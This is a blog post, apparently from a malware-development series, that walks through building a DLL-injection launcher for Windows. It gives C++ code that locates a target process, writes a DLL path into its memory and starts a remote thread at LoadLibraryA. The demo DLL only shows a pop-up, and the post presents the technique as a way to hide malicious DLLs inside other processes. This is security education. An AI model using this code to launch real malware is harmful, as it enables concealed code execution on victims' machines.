---
title: Malware Launching - DLL Injection
categories:
- Malware Development
description: DLL Injection to execute malicious DLL files
---

# Malware Launching - DLL Injection

## 1. Context


Ever since I started malware development, I've always been interested in the concept of malware launching.


The idea is that malware launcher is an a type of malware that can download/unpack and execute a malware. The goal of the launcher is to set things up so the malicious activity of the actual malware is concealed from users.


In this blog post, I'll attempt to develop and recreate a launcher that I recently analyze that uses one of the simplest process injection technique, called DLL Injection.


## 2. Concept


The concept of DLL injection is just like how it sounds, injecting code from a DLL into a running process. 


Let's say that we somehow have got a malicious DLL file on our machine with the name **Malware.dll**. Maybe it's been downloaded at the same time with the launcher, or the launcher can download it. The point is, it exists on our machine.


DLL files, although are PE files, can't be execute on their own. Usually, they export their functions so other executables can use them. However, DLL files do have a ***main*** function!


According to [MSDN](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain), when the system starts or terminates a process or thread, it calls the entry-point function (DLL main) for each loaded DLL using the first thread of the process. Basically, if a process loads a DLL, then DLL main will be called. Most of the time, normal DLL files do not use this function because it is rarely related to their functionality.


However, DLL main is also called when a process/thread calls [LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)!


Therefore, the technique of DLL injection requires that we
  - First, get the address of **LoadLibrary** from **Kernel32.dll**
  - Second, push the string name of the malicious DLL with the malicious main function into virtual memory of the process using [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) and [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
  - Third, create a new thread of that process with the entry point of the address of **LoadLibrary** and the command line argument of the string name of the malicious DLL using [CreatRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).


When this thread executes, the entry point will cause the thread to call **LoadLibrary** with the parameter of the DLL file, and the DLL main function will be executed!


This injection will completely hide the DLL functionality from Task Manager or Process Explorer because it will be ran as the parent process that we created.


## 3. Prepare DLL file


Using Visual Studio, we can create a DLL project to write our own DLL. Here is my simple DLL main function.


![alt text](/uploads/DLL.PNG)


Basically, when ***ul_reason_for_call*** equals to **DLL_PROCESS_ATTACH**, we know the library is loaded when the process just starts. 


If this is the case, then we create a simple pop-up with [MessageBoxA](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa);


We will use this DLL to inject into a process of our choice later, and we can check if the injection is successful by checking for this pop-up.


## 4. DLL Injection Code


For the injection code, first we need 2 things:
  - **processName**: the name of the process we want to inject(**svchost.exe, python.exe, or whatever**)
  - **dllFileName**: the name of the dll file with the malicious main function


#### I. Find process ID


First, we need to find the process ID of the process with **processName**.


We can do this by calling [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) to take a snapshot of all of the currently running processes.


Next, we can use [Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) to iterate through this process list from the snapshot and check if any of the process has the same name as **processName**.


If we find it, we record its process ID.


``` cpp
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   // Snapshot of processes

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printError("CreateToolhelp32Snapshot");
		return;
	}

	LPPROCESSENTRY32 processEntry = (LPPROCESSENTRY32)(&PROCESSENTRY32());

	processEntry->dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnapshot, processEntry) == 0) {
		printError("Process32First");
		CloseHandle(hSnapshot);
		return;
	}

	DWORD dwProcessID = 0;
	while (Process32Next(hSnapshot, processEntry) != 0) {
		wstring temp(processEntry->szExeFile);
		string name(temp.begin(), temp.end());
		if (!strcmp(name.c_str(), processName)) {                   // if process name matches, save process ID
			dwProcessID = processEntry->th32ProcessID;
			printf("FIND process ID of 0x%x for %s!!\nStarting injection\n", dwProcessID, name.c_str());
			break;
		}
	}
```


#### II. Open process and write memory


Next, we need to get a handle of the process using [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess).


From this, we can alloc space in the process's virtual memory space and write the DLL name there. 


The reason we need to do this is that the process has its own virtual memory, and the only way for it to use our **dllFileName** is by writing the file name into its own memory.


We can accomplish this using [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) and [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).


``` cpp
    HANDLE hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	if (hVictimProcess == INVALID_HANDLE_VALUE) {
		printError("OpenProcess");
		CloseHandle(hSnapshot);
		return;
	}

	
	LPVOID nameBuffer = VirtualAllocEx(hVictimProcess, NULL, strlen(dllFileName), MEM_COMMIT, PAGE_READWRITE);
	if (!nameBuffer) {
		printError("VirtualAllocEx");
		CloseHandle(hVictimProcess);
		CloseHandle(hSnapshot);
		return;
	}

    // Write dll name into virtual memory of the process
	if (!WriteProcessMemory(hVictimProcess, nameBuffer, dllFileName, strlen(dllFileName), NULL)) {
		printError("WriteProcessMemory");
		CloseHandle(hVictimProcess);
		CloseHandle(hSnapshot);
		return;
	}
```


#### III. Get the address of LoadLibraryA


Next, we need to set the entry point of our to-be-created thread to **LoadLibraryA** so the first thing it executes is this function.


To do this, we need to get a handle to **Kernel32.dll** through [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea).


Then, using this handle, we can retrieve the address of **LoadLibraryA** through [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress).


``` cpp
    HMODULE hKernel32 = GetModuleHandle(L"Kernel32.dll");
	if (!hKernel32) {
		printError("GetModuleHandle");
		CloseHandle(hVictimProcess);
		CloseHandle(hSnapshot);
		return;
	}
	FARPROC fpLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
	DWORD dwInjectedProcessID = 0;

	if (!fpLoadLibrary) {
		printError("GetProcAddress");
		CloseHandle(hVictimProcess);
		CloseHandle(hSnapshot);
		return;
	}
```


#### IV. Injection!!


The only thing left to do is calling [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).

**CreateRemoteThread** takes in these parameters:
  - **hProcess**: pass in *hVictimProcess* from **OpenProcess**
  - **lpThreadAttributes**: pass in NULL because we don't care about this
  - **dwStackSize**: pass in 0 to use the default stack size
  - **lpStartAddress**: pass in *fpLoadLibrary* so the thread's entry point will be at **LoadLibrary**
  - **lpParameter**: pass in *nameBuffer* so the thread will call **LoadLibrary(nameBuffer)**
  - **dwCreationFlags**: pass in 0 to have the thread runs immediately after execution
  - **lpThreadId**: pass in a pointer to a new thread ID, this is not necessary, but we can do it if we want.


``` cpp
	HANDLE hInjectedThread = CreateRemoteThread(hVictimProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fpLoadLibrary, nameBuffer, 0, &dwInjectedProcessID);
	if (!hInjectedThread) {
		printError("CreateRemoteThread");
		CloseHandle(hVictimProcess);
		CloseHandle(hSnapshot);
		return;
	}
```

And here should be the result. I'm creating a **python.exe** process running an infinite loop, and I will attempt to inject my own DLL into this process and have the pop-up shows up.

{% include figure.html image="/uploads/dll_injection_result.gif" position="center" %}
## 5. Wrapping up


That's all there is to DLL injection!

It's a pretty simple yet useful concept to launch malicious DLLs. Feel free to check my Github [repo](https://github.com/cdong1012/DLLInjection) for this project here!
